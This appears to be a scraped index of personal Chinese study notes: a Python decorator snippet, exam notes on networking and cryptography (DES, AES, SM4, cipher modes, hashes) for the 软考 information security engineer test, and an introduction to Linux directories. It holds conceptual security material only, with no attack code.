functools import wraps def wrapper(func): @wraps(func) #带参数的装饰器 def inner(*args,**kwargs): print('在被装饰的函数执行前做的事') ret = func(*args,**kwargs) print('在被装饰的函数执行后做的事') return ret return inner @wrapper def holiday(day): '''这是一个放假通知''' print('全体放假%s天'%day) return '好耶' print(holiday.__name__) #输出：holiday，若没有第1,3行代码，则输出inner的信息 print(holiday.__doc__) ret = holiday(3) print(ret) Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2021-01-20 15:25 "},"软考-信息安全工程师/第一版.html":{"url":"软考-信息安全工程师/第一版.html","title":"第一版","keywords":"","body":"软考-信息安全工程师（第一版） 选择题：当你不确定答案的时候，留意绝对性词语 第一章-计算机硬件基础 （略） 第二章-计算机网络基础 OSI七层模型 | 层次 | 名称 | 主要功能 | 主要设备及协议 | | ---- | ---------- | ---------------------------------- | ---------------------------------------------------- | | 7 | 应用层 | 实现具体的应用功能 | POP3、FTP、HTTP、Telnet、SMTP、DHCP、TFTP、SNMP、DNS | | 6 | 表示层 | 数据的格式与表达、加密、压缩 | | | 5 | 会话层 | 建立、管理和终止会话 | | | 4 | 传输层 | 端到端的连接 | TCP、UDP | | 3 | 网络层 | 分组传输和路由选择 | 三层交换机、路由器、ARP、RARP、IP、ICMP、IGMP | | 2 | 数据链路层 | 传送以帧为单位的信息、保证数据正确 | 网桥、交换机、网卡、PPTP、L2TP、SLIP、PPP | | 1 | 物理层 | 二进制传输 | 中继器、集线器 | TCP/IP模型与OSI模型 ARP：实现IP地址到物理地址的映射；RARP：实现物理地址到IP地址的映射 公用IP地址 将IP地址第一段转换为二进制，对比开头即可判断是哪类地址。 专用IP地址 A类：10.0.0.0~10.255.255.255，最大主机数：2^24-2=16777214 B类：172.16.0.0~172.31.255.255，最大主机数：2^16-2=65534 C类：192.168.0.0~192.168.255.255，最大主机数：2^8-2=254 子网掩码 将一个网络划分成多个子网（取部分主机号当子网号） 将多个网络合并成一个大的网络（取部分网络号当主机号） 将IP地址与子网掩码的二进制进行“与”运算即可获得网络地址 顶级域名 .com：商业机构 .net：网络服务机构 .org：非营利性组织 .gov：政府机构 .edu：教育机构 .mil：军事机构 IPv6 128 位的地址空间（2^128） 由 8 个 16 进制字段构成 IPvV6地址的省写 例如：2001:0db8:85a3:0000:1319:8a2e:0370:7344等价于：2001:0db8:85a3::1319:8a2e:0370:7344 遵守这些规则，如果因为省略而出现了两个以上的冒号，则可以压缩为一个，但这种零压缩在地址中只能出现一次。因此： 2001:0DB8:0000:0000:0000:0000:1428:57ab 2001:0DB8:0000:0000:0000::1428:57ab 2001:0DB8:0:0:0:0:1428:57ab 2001:0DB8:0::0:1428:57ab 2001:0DB8::1428:57ab 以上都是合法的地址，并且它们是等价的。同时前导的零可以省略，因此2001:0DB8:02de::0e13等价于2001:DB8:2de::e13 第三章-信息安全基础知识 信息安全三要素：机密性（confidentiality）、完整性（integrity）、可用性（availability） 机密性：信息不被未授权者知晓 完整性：信息是正确的、真实的、未被篡改的、完整无缺的 可用性：信息可以随时正常使用 信息安全管理体系 密码管理：基于密码机制的安全系统 网络管理：功能上包括：配置管理、性能管理、安全管理、故障管理；体系结构包括：协议、表示、安全、对象四方面 设备管理：包括设备的选型、检测、安装、登记、使用、维护和存储管理等 人员管理：确保有关业务人员的思想素质、职业道德和业务素质 我国的商用密码管理原船，在中共中央办公厅1996年27号文中，明确了我国发展和管理商用密码实行\"统一领导，集中管理，定点研制，专控经营，满足使用\"的20字方针。 国家密码管理局于2006年1月6日发布公告，公布了\"无线局域网产品须使用的系列密码算法\"包括: 对称密码算法：SMS4 签名算法：ECDSA 密钥协商算法：ECDH 杂凑算法：SHA-256 随机数生成算法：自行选择 信息系统安全可以划分为以下四个层次：设备安全，数据安全， 内容安全，行为安全。其中数据安全即是传统的信息安全。 信息安全等级保护（记忆：用系安结访） 用户自主保护级：隔离用户和数据 系统审计保护级：在自主访问控制的基础上控制访问权限扩散 安全标记保护级：具备审计保护所有的功能，提供有关安全策略模型、数据标记，具备准确地标记输出信息的能力，消除通过测试发现的任何错误 结构化保护级：在安全标记保护级实施的自主和强制访问控制基础上，进一步扩展到所有主体和客体，能够审计利用隐蔽存储信道时可能被使用的事件 访问验证保护级：满足访问监视器需求，访问监视器仲裁主体对客体的全部访问 涉密信息系统安全分级保护 秘密级：其防护水平不低于国家信息安全等级保护三级要求 机密级：其防护水平不低于国家信息安全等级保护四级要求 绝密级：其防护水平不低于国家信息安全等级保护五级要求 网络隔离 第一代【完全隔离】：完全的物理隔离 第二代【硬件卡隔离】：增加硬件卡隔离 第三代【数据转播隔离】：利用转播系统分时复制文件的途径来实现隔离 第四代【空气开关隔离】：使用单刀双掷开关 第五代【安全通道隔离】：通过专用通道硬件和专有安全协议等安全机制来实现内外网络的隔离和数据交换 系统安全监控，是指对系统的运行状况和系统中的用户的行为进行监视、控制和记录。安全监控的内容包括有主机系统监视、网络状态监视、用户操作监视、主机应用监视、主机外设监视、网络连接监视等。 安全监控主要分为： 网络安全监控：全面的网络安全机制、细粒度的控制、网络审计和其他包括日志、报警和拦截等功能 主机安全监控：访问控制、系统监控、系统审计、系统漏洞检查 风险评估方法一般可分为三类：定量、定性、定性与定量相结合的综合评估法。 信息安全风险评估过程 确定资产：确定信息系统的资产，并明确资产的价值 脆弱性和威胁分析：发现资产的脆弱点及由脆弱点所引发的威胁 制定及评估控制措施：在分析各种威胁及它们发生可能性的基础上，研究消除、减轻、转移威胁风险的手段 决策：包括评估影响、排列风险、制定决策 沟通与交流：决策经由领导层的签字批准，并与各方面就决策结论进行沟通 监督实施：安全措施的实施过程要始终在监督下进行 知识产权保护——保护期限 知识产权保护——产权人确定 知识产权保护——侵权判断 软件著作权产生的时间：自软件开发完成之日起。 【商业秘密权】可以保护软件的技术信息、经营信息。 【软件著作权】保护的是软件产品本身 【专利权】保护的是创造性的成果 信息安全标注化 国际标准：ISO、IEC等国际标准化组织 国家标准：GB-中国，ANSI-美国，BS-英国，JIS-日本 区域(地方)标准：PASC-太平洋地区标准会议，CEN-欧洲标准委员会，ASAC-亚洲标准咨询委员会，ARSO-非洲地区标准化组织 行业标准：GJB-中国军用标准，MIT-S——美国军用标准，IEEE-美国电气电子工程师协会 企业标准 我国国家标准代号：强制性标准代号为GB，推荐性标准代号为GB/T，指导性标准代号为GB/Z，实物标准代号GSB 行业标准代号：由汉语拼音大写字母组成（如电力行业为DL） 地方标准代号：由DB加上省级行政区划分代码的前两位 企业标准代号：由Q加上企业代号组成 第四章-密码学 基本概念 密码学由密码编制学（密码编制）和密码分析学（密码破译）共同组成。 密码学的安全目标： 保密性：确保信息仅被合法用户访问，而不被泄露给非授权用户、实体或过程 完整性：指所有资源只能由授权方或以授权的方式进行修改，即信息未经授权不能进行改变 可用性：指所有资源在适当的时候可以由授权方访问 密码体制（密码系统）： 明文空间M：全体明文的集合 密文空间C：全体密文的集合 密钥空间K：全体密钥的集合，其中每一个密钥K均由加密密钥 K~e~ 和解密密钥 K~d~ 组成，即 K = 加密算法E：一族由 M 到 C 的加密变换 解密算法D：一族由 C 到 M 的解密变换 对于每一个确定的密钥，加密算法将确定一个具体的加密变换，解密算法将确定一个具体的解密变换，而且解密变换就是加密变换的逆变换。对于明文空间M中的每一个明文 M，加密算法E在密钥 K~e~ 的控制下将明文M加密成密文 C：C=E（M，K~e~）；而解密算法D在密钥 K~d~ 的控制下将密文C解密出同一个明文 M：M = D（C，K~d~）= D（E（M，K~e~），K~d~） 如果一个密码体制的 K~d~ = K~e~ ，或由其中一个很容易推出另一个，则称为单密钥密码体制或对称密码体制或传统密码体制。否则称为双密钥密码体制（非对称密码体制）。 密码分析者攻击密码的方法： 穷举攻击：采用依次试遍所有可能的密钥对所获得的密文进行解密，直至得到正确的明文；或者用一个确定的密钥对所有可能的明文进行加密，直至得到所获得的密文。 数学分析攻击：针对加解密算法的数学基础和某些密码学特性，通过数学求解的方法来破译密码。 基于物理的攻击：利用密码系统实现时泄露的额外信息，推到密码系统中的秘密参数。主要方法包括功耗攻击、电磁场攻击和时间攻击。 密码分析者可利用的数据资源： 仅知密文攻击：攻击者仅根据截获的密文来破译密码。 已知明文攻击：攻击者根据已知的某些明文-密文对来破译密码。（近现代密码学认为，一个密码仅当它能经得起已知明文攻击时才是可取的） 选择明文攻击：攻击者能够选择明文并获得相应的密文 选择密文攻击：攻击者能够选择密文并获得相应的明文（主要攻击公钥密码体制，特别是数字签名） 一个密码，如果无论密码分析者截获了多少密文和用什么技术方法进行攻击都不能被攻破，则称为是绝对不可破译的。绝对不可破译的密码在理论上是存在的，这就是著名的“一次一密“密码。 古典密码 置换密码：把明文中的字母重新排列，字母本身不变，但其位置改变了。 代替密码：首先构造一个或多个密文字母表，然后用密文字母表中的字母或字母组来代替明文字母或字母组，各字母或字母组的相对位置不变，但其本身改变了。代替密码又分为：加法密码、乘法密码、仿射密码。 加法密码：密文 B = {(a~0~+K) mod n，(a~1~+K) mod n，...，(a~n-1~+K) mod n}；要求 K 是满足 0＜K＜n 的正整数。Caesar（凯撒）密码（K=3）：把明文字母表循环右移3位得到密文字母表 乘法密码：密文 B = {a~0~K mod n，a~1~K mod n，...，a~n-1~K mod n}；要求 0＜K＜n 且 K 与 n *互素（公约数只有1的两个整数，如：13和26的公约数为13则不可）。 仿射密码：密文 B = {(a~0~K~0~+K~1~)mod n，(a~1~K~0~+K~1~)mod n，...，(a~n-1~*K~0~+K~1~)mod n}；要求 K~0~ 与 n 互素，0≤K~0~＜n；且不允许同时有 K~0~=0，K~1~=1 简单代替密码：只使用一个密文字母表，并且用密文字母表中的一个字母来代替一个明文字母表中的一个字母。比如：加法密码、乘法密码。 多表代替密码：用多个密文字母表，明文中的每一个字母都有多种可能的字母来代替。多表代替密码的密钥就是这组映射函数或密文字母表，比如著名的 Vigenre（维吉尼亚）密码。 Vigenre（维吉尼亚）密码的代替规则是用明文字母在 Vigenre 方阵中的列和密钥字母在 Vigenre 方阵中的行的交点处的字母来代替该明文字母。 代数密码：Vernam（维尔南）密码的明文、密钥和密文均用二元数字序列表示。设明文 M =（m~0~，m~1~，...，m~n-1~），密钥 K =（k~0~，k~1~，...，k~n-1~），密文 C =（c~0~，c~1~，...，c~n-1~），其中 m~i~，k~i~，c~i~ ∈ GF(2)，则 c~i~ = m~i~ ⊕ k~i~ ，i = 0,1,...,n-1；Vernam 密码的加密和解密非常简单，而且特别适合计算机和通信系统的应用。 Vernam 密码经不起己知明文攻击。这是因为只要知道了某些明文-密文对，便可以迅速确定出相应的密钥。如果同一密钥重复使用或密钥本身包含重复，则 Vernam 密码将是不安全的。据此，为了增强 Vernam（维尔南）密码的强度，应当避免密钥重复使用，避免密钥本身包含重复。一种极端情况是：①密钥是真正的随机序列；②密钥至少和现文一样长；③一个密钥只使用一次。如果能够做到这些，则密码就是绝对不可破译的了。 古典密码的破译方法： 穷举分析 加法密码：对 K 的可能取值逐一穷举 乘法密码：密钥 K 要满足条件（n，k）= 1 仿射密码：密钥 K 有 26×12-1 = 311 种 统计分析 单代替密码的破译大致过程是：首先统计密文的各种统计特征；其次分析双字母、三字母密文组，以区分元音和辅音字母；最后分析字母较多的密文。 分组密码 分组密码将明文 M 划分为一系列的明文块 M~i~ ，通常每块包含若干位或字符，并且对每一块都用同一个密钥K~e~进行加密。 序列密码将明文和密钥都划分为位 (bit) 或字符的序列，并且对于明文序列中的每一位或字符都用密钥序列中的对应分量来加密。 分组密码每一次加密一个明文块，而序列密码每一次加密一位或一个字符。分组密码和序列密码在计算机系统中都有广泛的应用。序列密码是要害部门使用的主流密码，而商用领域则多用分组密码。 DES 算法 DES 是一种分组密码。明文、密文和密钥的分组长度都是 64 位。 DES 是面向二进制的密码算法。因而能够加解密任何形式的计算机数据。 DES 是对合运算，因而加密和解密共用同一算法，从而使工程实现的工作量减半。 Feistel 结构。 DES 加密过程 子密钥产生过程（详见《信息安全工程师5天修炼》P42） 种子密钥长 64 位，实际使用 56 位，密钥中位置为 8 的整数倍的奇偶校验位共 8 个。 64 位密钥经过置换选择PC1（64→56位）、循环左移（56位）、置换选择PC2（56→48位），产生16个长48位的子密钥K~1~~K~16~ 加密函数f：选择运算 E 把 R~i-1~ 的 32 位扩展到 48 位，并与 48 位子密钥 K~i~ 进行异或运算；然后通过S盒变换，将 48 位输入变为 32 位输出；最后进行置换运算P将S盒的 32 位输出进行一次置换。 S盒变换： 例如：当 S~1~ 盒输入为 “111000” 时，则第 1 位与第 6 位组成二进制串 “10”（十进制2），中间四位组成二进制 “1100”（十进制12）。查询 S~1~ 盒的 2 行 12 列，得到数字 3 ，得到二进制数是 0011 。输入 6 位，输出 4 位。 DES 的安全性 如果 DES 密钥太短则经不起穷举攻击。 DES 存在弱密钥和半弱密钥。 弱密钥：K~1~=K~2~=...=K~16~；弱密钥不受任何循环移位的影响，并且只能得到相同的子密钥，由全 0 或全 1 组成的密钥显然是弱密钥，子密钥生成过程中被分割的两部分分别为全 0 或全 1 时也是弱密得，DES 算法并且存在 4个弱密钥。 半弱密钥：由其产生的子密钥有些相同但不完全相同。有些种子密钥只能生成两个不同的子密钥，这样的种子密钥K称为半弱密钥，DES 至少存在 12 个半弱密钥。半弱密钥将导致把明文加密成相同的密文。 3DES 3DES 是 DES 的扩展，是执行看三次的 DES。3DES 安全强度较高，可以抵抗穷举攻击，但是用软件实现起来速度比较慢。 3DES 的两种加密方式 第一、第三次加密使用同一密钥，这种加密方式的密钥长度为 128 位（ 112 位有效） 三次加密使用不同密钥，这种加密方式的密钥长度为 19 2位（ 168 位有效） AES 算法 数据长度可变 AES 中一般将明文、密文分组长度固定为 128 位。 密钥长度可以为 128、192 或 256 位。 SP 结构。 AES 算法框架 明文State，二维矩阵表示，该数组为 4 行，N~b~ 列，设为 4 × N~b~ ；数组每个元素为 1 个字节，即为 2 个十六进制数。N~b~ = 数据块长度/32。 密钥State，二维矩阵表示，该数组为 4 行，N~k~ 列，设为 4 × N~k~ ；数组每个元素为 1 个字节，即为 2 个十六进制数。N~k~ = 数据块长度/32。 加密轮数 N~r~ ，取决于明文块和密钥块的长度。当明文块和密钥块的长度都为 128 位时，迭代次数为 10 次；当明文块或密钥块的长度为 192 位时，迭代次数为 12 次；当明文块或密钥块的长度为 256 位时，迭代次数为 14 次。 加密：首先执行“子密钥加”算法；然后进行 n-1 轮加密操作，每轮包含”字节代换“、”行移位“、”列混淆“、”子密钥加“；第 n 轮加密操作少了一步”列混淆“。 解密：执行的是逆过程，算法不完全一致。AES 不是对合运算，即 (AES)^-1^ ≠ AES 子密钥加（最初）：明文分组与种子密钥按位进行异或运算。 字节代换ByteSub：输入State中的每一个字节，通过查询S盒替换成新的State。如当前State某元素为 “51” 是指查询S盒的第 5 行第 1 列，得到 “D1” 。 行位移变换ShiftRow： 当明文长度为 128、192 位时，State矩阵第 0 行循环左移 0 字节，第 1 行循环左移 1 字节，第 2 行循环左移 2 字节，第 3 行循环左移 3 字节。 当明文长度为 256 位时，State矩阵第 0 行循环左移 0 字节，第 1 行循环左移 1 字节，第 2 行循环左移 3 字节，第 3 行循环左移 4 字节。 列混淆Mixcolimn：列混淆是对状态的列进行混合变换。把状态中的每一列看作 GF(2^8^) 上的多项式，并与一个固定多项式 c(x) 相乘然后模多项式扩 x^4^+1 ，其中 c(x) 为：c(x) = '03'x^3^ + '01'x^2^ + '01'x + '02' ,只有 c(x) 与 x^4^+1 是互素的，才能保证 c(x) 存在逆多项式 d(x) ，只有逆多项式 d(x) 的存在，才能正确进行解密。 子密钥加（轮函数）AddRoundKey：中间State与该轮子密钥进行异或运算。 解密过程 逆行位移InvShiftRow：State矩阵第 0 行循环右移 0 字节，第 1 行循环右移 1 字节，第 2 行循环右移 2 字节，第 3 行循环右移 3 字节。 逆字节代换InvByteSub：通过查询逆S盒实现。 AddRoundKey的逆就是它自己。 逆列混淆InvMixColumn：把状态的每列都乘以一个固定的多项式 d(x)： d(x) ='OB' X^3^ + 'OD' X^2^ + '09x' + 'OE' ，即 S'(x) = d(x)s(x) mod (x^4^ + 1) 。 AES算法的安全性 不存在弱密钥 该算法对密钥的选择没有任何限制，还没有发现弱密钥和半弱密钥的存在。 抗攻击能力强 可抗击穷举密钥的攻击。因为AES的密钥长度可变，针对 128/192/256bit 的密钥，密钥量为 2^128^/2^192^/2^256^ ，足以抵抗穷举搜索攻击。 可抗击线性攻击，经 4 轮变换后，线性分析就无能为力了。 可抗击差分攻击，经 8 轮变换后，差分攻击就无从着手了。 适应性强 数据块长度和密钥长度都可变，因此能够适应不同的安全应用环境。 SM4 算法 2006 年我国国家密码管理局公布了无线局域网产品使用的 SM4 密码算法。 SM4 的数据分组长度和密钥长度都是 128 位。 加密算法与密钥扩展算法都采用 32 轮迭代结构。 SM4 密码算法以字节（8 位）和字（32 位）为单位进行数据处理。 SM4 密码算法是对合运算，解密算法与加密算法相同，只是轮密钥的使用顺序相反。 非对称 Feistel 结构。 基本运算 模 2 加：⊕ ，32 位异或运算 循环移位： SM4 算法框架 密码部件 S 盒：SM4 的 S 盒是一种以字节为单位的非线性代替变换，其密码学的作用在于起到混淆的作用。S 盒的输入和输出都是 8 位的字节。它本质上是 8 位的非线性置换。设输入字节为 \"bf\" ，则查询 S 盒表的 b 行 f 列，得到输出字节为 \"51\" ；即 S_Box ('bf') = '51' 非线性变换 τ ：SM4 的非线性变换 τ 是一种以字为单位的非线性代替变换。它由 4 个 S 盒并置构成。本质上它是 S 盒的一种并行应用。 线性变换部件 L ：线性变换部件 L 是以字为处理单位的线性变换部件，其输入输出都是 32 位的字。其密码学的作用在于起到扩散的作用。 合成变换 T ：合成变换 T 由非线性变换 τ 和线性变换 L 复合而成，数据处理的单位是字。 轮函数：SM4 密码算法采用对基本轮函数进行迭代的结构。利用上述基本密码部件，便可构成轮函数。SM4 密码算法的轮函数是一种以字为处理单位的密码函数。轮函数的输入为 4 个 32 位字，共 128 位。轮密 rk 也是一个 32 位的字。轮函数的输出也是一个 32 位的字。 三种算法的对比 DES AES SM4 明文分组长度 64 位 128 位 128 位 密钥长度 64（56）位 128 位、192 位、256 位 128 位 子密钥长度 16 × 48 位 4 × N~k~ 二维矩阵，N~k~ = 数据块长度/32 32 × 32 位 算法结构 Feistel 结构 SP 结构 非对称 Feistel 结构 对合运算？ √ X √ 密码部件 加密函数：选择运算E、异或运算、S盒变换、置换运算P 加密函数：字节代换（S盒变换），行位移变换，列混淆，子密钥加 加密函数：S盒变换，非线性变换 τ，线性变换部件 L，合成变换 T 分组密码工作模式 分组密码工作模式是指以某个分组密码算法为基础，解决对任意长度的明文的加密问题的方法。 电码本模式 ECB 直接利用分组密码对明文的各分组进行加密。 特点： 要求数据的长度是密码分组长度的整数倍，否则最后一个数据块将是短块，需要特殊处理。 非常适合处理短数据加密，适合并行计算。 容易暴露明文的数据模式。 同一明文分组对应的密文分组也相同。 密码分组链接模式 CBC 特点： 要求数据的长度是密码分组长度的整数倍，否则最后一个数据块将是短块，需要特殊处理。 解决了 ECB 的安全缺陷，可以让重复的明文分组产生不同的密文分组。 明密文链接方式 除初始向量外，输入是前一组的密文和前一组的明文异或后，再与当前的明文组异或。 加解密均会引发错误传播无界（明文或密文错误会引发后续数据全部错误） 密文链接方式 除初始向量外，输入是前一组的密文与当前明文组的异或。 加密错误会引发错误传播无界，解密错误会引发错误传播有界（明文或密文错误只产生有限几个数据错误） 输出反馈模式 OFB 特点： 这种工作模式的安全性取决于分组密码本身的安全性。其将一个分组密码转换为一个序列密码。 它具有普通序列密码的优缺点，如没有错误传播。设加/解密时错了一位，则只影响密/明文中对应一位，不影响其他位。但因无错误传播而对密文的篡改难以检测。 适于加密冗余度较大的数据，如语音和图像数据。 工作原理： 种子 I~0~ 的值赋值为位移寄存器 R 的初值。 利用分组算法 E（如DES、AES、SM4）加密移位寄存器 R 中的内容为密文，并 “选取最右边的 S 位” 作为输出，与明文 m~i~ 异或得到 C~i~ 。 移位寄存器 R 先左移 S 位，然后将加密算法 E 输出的最右 S 位赋值到寄存器 R 的右 S 位。 继续②③步，直到把分组密码变为序列密码。 密码反馈模式 CFB 特点： CFB 与 OFB 模式相似，不同的是填充移位寄存器 R 的不是加密算法 E 输出的最右 S 位，而是 E 输出与明文异或后的密文 C~i~ 的 S 位。 CFB 模式的加解密具有错误传播无界的特性，使得密文反馈工作模式适合数据完整性认证方面的应用。 计数器模式 CTR 特点： CTR 模式与 OFB 和 CFB 一样，把分组密码转化为序列密码，按序列密码的方式进行加解密。 CTR 模式的加密算法是对合运算，加解密过程仅涉及加密运算，不涉及解密运算。 优点是可并行、效率高、适合任意长度的数据、加解密速度快，而且在加解密处理方式上适合随机存取数据的加解密。因此，特别适合计算机随机文件的加密，因为随机文件要求能随机地访问。这对数据库加密是有重要意义的。 缺点是没有错误传播，因此不适合用于数据完整性认证。 序列密码 序列密码又称流密码，原理是明文流与密钥流按顺序逐比特进行异或运算，从而产生密文流。 序列密码的加密和解密运算只是简单的模二加运算，所以序列密码的强度依靠密钥序列的随机性和不可预测性。序列密码中的关键是要保持通信双方的精确同步。 序列密码的加密和解密运算是对合运算。 位移寄存器 待补充 RC4 序列密码算法 RC4 是一种密钥流产生算法。 RC4 密码与基于移位寄存器的序列密码不同，它是一种基于非线性数据表变换的序列密码。 RC4 包含两个算法：密钥调度算法（KSA）和伪随机生成算法（PRGA） 祖冲之算法 ZUC 该算法是我国第一个成为国际密码标准的密码算法，成为 3GPP LTE 第三套加密标准核心算法。该算法由比特重组、非线性函数 F、线性反馈位移寄存器（LFSR）组成。该算法输出序列的随机性好，周期足够大；可以抵抗已知的序列密码分析，可抵抗弱密分析。 Hash 函数 Hash 函数又称哈希函数、散列函数，是将任意长度的消息输出为定长的 hash码。Hash 函数用于构建数据的“指纹”，主要用于数据完整性、数字签名、消息认证等。 特性： 单向性：已知 hash 函数值 h ，求 H(x) = h 的 x 在计算上是不可行的。由 Hash 值不能得出相应的报文。 抗弱碰撞性：对任何给定的数据 x ，找到满足 y ≠ x 且 H(x) = H(y) 的 y 在计算上是不可行的。不能找到与给定报文具有相同 Hash 值的另一个报文。 抗强碰撞性：两个不同消息 m 和 m' ，使得 H(m) = H(m') 在计算上是不可行的。（抵抗生日攻击的能力强弱）不同的报文所得到的 Hash 值是不同的。 MD5 算法 其消息分组长度为 512 位，生成 128 位的摘要。 SHA 算法 安全 Hash 算法（SHA）其输入为长度小于 2^64^ 位的报文，该算法对报文按 512 位为单位分组处理，输出为 160 位的报文摘要。 算法步骤： 填充报文：使报文长度与 448 模 512 同余（即长度 = 448 mod 512）。若报文本身已经满足上述要求，仍然需要进行填充（例如：若报文长度为 448 位，则仍需填充 512 位使其长度为 960 位），因此填充位数在 1 和 512 之间。填充方法是在报文后附加一个 1 和若干个 0 。然后附上表示填充前报文长度的 64 为数据（最高有效位在前）。需满足总长度：≤ 2^64^ - 1 初始化缓冲区：初始化 5 个 32 位的寄存器。 执行算法主循环：每次循环处理 512 位的分组。核心算法是具有 4 轮操作的压缩函数。循环次数是报文填充后的分组数。 输出：输出 160 位的摘要。 SM3 算法 SM3 算法是国家密码管理局与 2010 年颁布的安全密码杂凑算法。基本迭代结构采用了增强型的 Merkle-Damgard 结构，把长度 的信息，经过填充和迭代压缩，生成长度为 256 位的摘要。2018 年 10 月，SM3 正式成为国际标准。SM3 算法可用于数字签名和验证、消息认证码的生成与验证以及随机数的生成。 HMAC 消息完整性：指数据正确无误、完整不缺，使数据免受未授权的毁坏，就是确保数据的完整性。 消息认证码 MAC MAC 是基于消息和秘密钥的公开函数，其输出是固定长度的短数据块。MAC 和加密类似，需要明文、密钥、算法，但 MAC 算法不要求可逆性，而加密算法则要求可逆。 假定通信双方共享秘密钥 K ，发送方 A 向接收方 B 发送报文 M 并附上 MAC，记为：A→B：M║MAC 。接收方 B 到报文后用相同的秘密钥 K 和报文 M 进行相同的计算得出新的 MAC' ，若 MAC‘ = MAC，则： 接收的报文 M 没有被修改 接收的报文 M 是 A 所发送的 HMAC：Hash 消息认证码，是一种基于密钥和散列函数进行消息认证的方法。它要求通信双方共享密钥、约定算法、约定报文 Hash 运算（如MD5、SHA、SM3等）。 公钥密码体制 加密密钥和解密密钥不相同的算法，称为非对称加密算法，又称为公钥密码体制，解决了对称密钥算法的密钥分配与发送问题。公钥用于加密和认证，私钥用于解密和签名。公钥可以公开，私钥需要严格保密。 单向函数（MD5、SHA、SM3）加密效率高，但加密后不能还原： 已知 x ，要计算 y 很容易 已知 y ，要计算出 x 很难 单向陷门函数需满足： 具有陷门 已知 x ，要计算 y 很容易 已知 y ，如果不知道陷门，要计算出 x 很难；如果真的陷门，则计算出 x 很容易 实际上已找到的单向性足够的函数有： 因子分解问题：计算素数乘积容易（p×q→n），而计算因子分解困难（n→p×q） 离散对数问题：计算素数幂乘容易（x^y^→z），而计算对数困难（log~x~z→y） 公钥密码体制的特点： 明文 M 通过加密算法 E 和加密密钥 K~e~ 变成密文 C 用公式表示为：C = E (M,K~e~) 密文 C 通过解密算法 D 和解密密钥 K~d~ 还原为明文 M 用公式表示为：M = D (C,K~d~) 计算上不能由 K~e~ 求出 K~d~ 加密算法 E 和解密算法 D 都是高效的 数字信封技术：发送方将用对称密钥加密的密文和用接收方的公钥加密后的对称密钥密文发送给接收方；接收方用自己的私钥对对称密钥密文进行解密得到对称密钥，然后再对密文进行解密。适用于传输大量加密数据。 数字签名：发送方先用对方的公钥对明文进行加密成密文，接着使用自己的私钥对明文进行加密生成数字签名，然后将密文和数字签名发送给接收方；接收方使用对方的公钥对数字签名进行解密，然后与密文进行对比确认信息是否由发送方发送，再用自己的私钥还原明文。 RSA 密码 距离考试只有两个月时间了，居然说教材和大纲都要改版，难受......就这样了吧，第一版end. Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2020-08-31 21:14 "},"兄弟连Linux/Linux系统简介.html":{"url":"兄弟连Linux/Linux系统简介.html","title":"Linux系统简介","keywords":"","body":"Linux系统简介 以下均为Linux-CentOS为例 系统分区 磁盘分区 磁盘分区是使用分区编辑器（partition editor）在磁盘上划分几个逻辑部分。碟片一旦划分成数个分区（Partition），不同类的目录与文件可以存储进不同的分区。 分区类型 主分区：最多只能有4个 扩展分区： 最多只能有1个 主分区加扩展分区最多有4个 不能写入数据，只能包含逻辑分区逻辑分区 逻辑分区 从5开始 格式化 格式化（高级格式化）又称逻辑格式化，它是指根据用户选定的文件系统（如Windows：FAT16、FAT32、NTFS、Linux：EXT2、EXT3、EXT4等），在磁盘的特定区域写入特定数据，在分区中划出一片用于存放文件分配表、目录表等用于文件管理的磁盘空间。 Linux不靠扩展名区分文件类型 压缩包：“*.gz”、“*.bz2”、“*.tar.bz2”、“*.tgz”等 二进制软件包：“.rpm” 网页文件：“.html”、“.php” 脚本文件：“*.sh” 配置文件：“*.conf” 服务器注意事项 远程服务器不允许关机，只能重启 重启时应该关闭服务 不要在服务器访问高峰运行高负载命令 远程配置防火墙时不要把自己踢出服务器 指定合理的密码规范并定期更新 合理分配权限 定期备份重要数据和日志 目录介绍 /bin/：存放系统命令的目录，普通用户和超级用户都可以执行。不过放在/bin下的命令在单用户模式下也可以执行 /sbin/：保存和系统环境设置相关的命令，只有超级用户可以使用这些命令进行系统环境设置，但是有些命令可以允许普通用户查看 /usr/bin/：存放系统命令的目录，普通用户和超级用户都可以执行。这些命令和系统启动无关，在单用户模式下不能执行 /usr/sbin/：存放根文件系统不必要的系统管理命令，例如多数服务程序。只有超级用户可以使用。大家其实可以注意到Linux的系统，在所有“sbin”目录中保存的命令只有超级用户可以使用，“bin”目录中保存的命令所有用户都可以使用 /boot/：系统启动目录，保存系统启动相关的文件，如内核文件和启动引导程序（grub）文件等 /dev/：设备文件保存位置。我们已经说过Linux中所有内容以文件形式保存，包括硬件。那么这个目录就是用来保存所有硬件设备文件的 /etc/：配置文件保存位置。系统内所有采用默认安装方式（rpm安装）的服务的配置文件全部都保存在这个目录当中，如用户账户和密码，服务的启动脚本，常用服务的配置文件等 /home/：普通用户的家目录。建立每个用户时，每个用户要有一个默认登录位置，这个位置就是这个用户的家目录，所有普通用户的家目录就是在/home下建立一个和用户名相同的目录。如用户user1的家目录就是/home/user1 /lib/：系统调用的函数库保存位置 /lost+found/：当系统意外崩溃或机器意外关机，而产生一些文件碎片放在这里。当系统启动的过程中fsck工具会检查这里，并修复已经损坏的文件系统。这个目录只在每个分区中出现，例如/lost+found就是根分区的备份恢复目录，/boot/lost+found就是/boot分区的备份恢复目录 /media/：挂载目录。系统建议是用来挂载媒体设备的，例如软盘和光盘 /mnt/：挂载目录，早期Linux中只有这一个挂载目录，并没有细分。现在这个目录系统建议挂载额外设备，如U盘，移动硬盘和其他操作系统的分区 /misc/：挂载目录。系统建议用来挂载NFS服务的共享目录。我们在刚刚已经解释了挂载。童鞋们应该知道只要是一个已经建立的空目录就可以作为挂载点。那么系统虽然准备了三个默认挂载目录/media、/mnt、/misc，但是到底在哪个目录中挂载什么设备都可以由管理员自己决定。例如超哥接触Linux的时候，默认挂载目录只有/mnt一个，所以养成了在/mnt下建立不同目录挂载不同设备的习惯。如/mnt/cdrom挂载光盘，/mnt/usb挂载U盘，这都是可以的 /opt/：第三方安装的软件保存位置。这个目录就是放置和安装其他软件的位置，我手工安装的源码包软件都可以安装到这个目录当中。 /proc/：虚拟文件系统，该目录中的数据并不保存到硬盘当中，而是保存到内存当中。主要保存系统的内核，进程，外部设备状态和网络状态灯。如/proc/cpuinfo是保存CPU信息的，/proc/devices是保存设备驱动的列表的，/proc/filesystems是保存文件系统列表的，/proc/net/是保存网络协议信息的 /sys/：虚拟文件系统。和/proc目录相似，都是保存在内存当中的，主要是保存于内核相关信息的 